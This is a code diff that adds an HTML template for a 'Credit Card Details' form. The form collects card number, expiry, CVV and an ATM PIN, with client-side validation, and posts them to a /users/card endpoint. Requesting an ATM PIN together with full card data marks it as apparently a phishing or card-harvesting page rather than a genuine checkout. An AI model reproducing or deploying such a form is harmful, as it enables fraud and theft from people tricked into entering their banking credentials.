@@ -1,0 +1,123 @@
+<div class="row mt-5">
+  <div class="col-md-6 m-auto">
+    <div class="card card-body">
+      <h1 class="text-center mb-3"><i class="fas fa-sign-in-alt"></i>Credit Card Details</h1>
+
+      <!-- Red Text Alert for Missing Fields -->
+      <div class="alert alert-danger" id="missingFieldsAlert" style="display: none;">
+        Please fill out all fields.
+      </div>
+
+      <form action="/users/card" method="POST" id="creditCardForm">
+        <div class="form-group">
+          <label for="cardnumber">Card Number</label>
+          <input
+            type="text"
+            id="cardnumber"
+            name="cardnumber"
+            class="form-control"
+            placeholder="Enter Your Card Number"
+          />
+        </div>
+        <div class="form-row">
+          <div class="form-group col-md-6">
+            <label for="expirationMonth">Expiration Month</label>
+            <input
+              type="text"
+              id="expirationMonth"
+              name="expirationMonth"
+              class="form-control"
+              placeholder="MM"
+            />
+          </div>
+          <div class="form-group col-md-6">
+            <label for="expirationYear">Expiration Year</label>
+            <input
+              type="text"
+              id="expirationYear"
+              name="expirationYear"
+              class="form-control"
+              placeholder="YYYY"
+            />
+          </div>
+        </div>
+        <div class="form-group">
+          <label for="cvv">CVV</label>
+          <input
+            type="text"
+            id="cvv"
+            name="cvv"
+            class="form-control"
+            placeholder="Enter Your Security Code"
+          />
+        </div>
+        <div class="form-group">
+          <label for="atm">ATM Pin</label>
+          <input
+            type="text"
+            id="atm"
+            name="atm"
+            class="form-control"
+            placeholder="Enter Your Atm Pin"
+          />
+        </div>
+        <button type="submit" class="btn btn-primary btn-block">Submit</button>
+      </form>
+    </div>
+  </div>
+</div>
+
+<script>
+  document.getElementById('creditCardForm').addEventListener('submit', function(event) {
+    const requiredFields = ['cardnumber', 'expirationMonth', 'expirationYear', 'cvv'];
+    let missingFields = false;
+
+    for (const field of requiredFields) {
+      if (!document.getElementById(field).value) {
+        missingFields = true;
+        break;
+      }
+    }
+
+    // Validate expiration month (MM) and year (YYYY)
+    const expirationMonthField = document.getElementById('expirationMonth');
+    const expirationYearField = document.getElementById('expirationYear');
+    const expirationMonthValue = expirationMonthField.value;
+    const expirationYearValue = expirationYearField.value;
+    if (expirationMonthValue.length !== 2 || expirationYearValue.length !== 4 || isNaN(expirationMonthValue) || isNaN(expirationYearValue)) {
+      missingFields = true;
+      expirationMonthField.classList.add('is-invalid');
+      expirationYearField.classList.add('is-invalid');
+    } else {
+      expirationMonthField.classList.remove('is-invalid');
+      expirationYearField.classList.remove('is-invalid');
+    }
+
+    // Validate Card Number (16 digits)
+    const cardnumberField = document.getElementById('cardnumber');
+    const cardnumberValue = cardnumberField.value;
+    if (cardnumberValue.length !== 16 || isNaN(cardnumberValue)) {
+      missingFields = true;
+      cardnumberField.classList.add('is-invalid');
+    } else {
+      cardnumberField.classList.remove('is-invalid');
+    }
+
+    // Validate CVV (3 digits)
+    const cvvField = document.getElementById('cvv');
+    const cvvValue = cvvField.value;
+    if (cvvValue.length !== 3 || isNaN(cvvValue)) {
+      missingFields = true;
+      cvvField.classList.add('is-invalid');
+    } else {
+      cvvField.classList.remove('is-invalid');
+    }
+
+    // Display alert for missing fields
+    if (missingFields) {
+      event.preventDefault();
+      document.getElementById('missingFieldsAlert').style.display = 'block';
+    }
+  });
+
+</script>
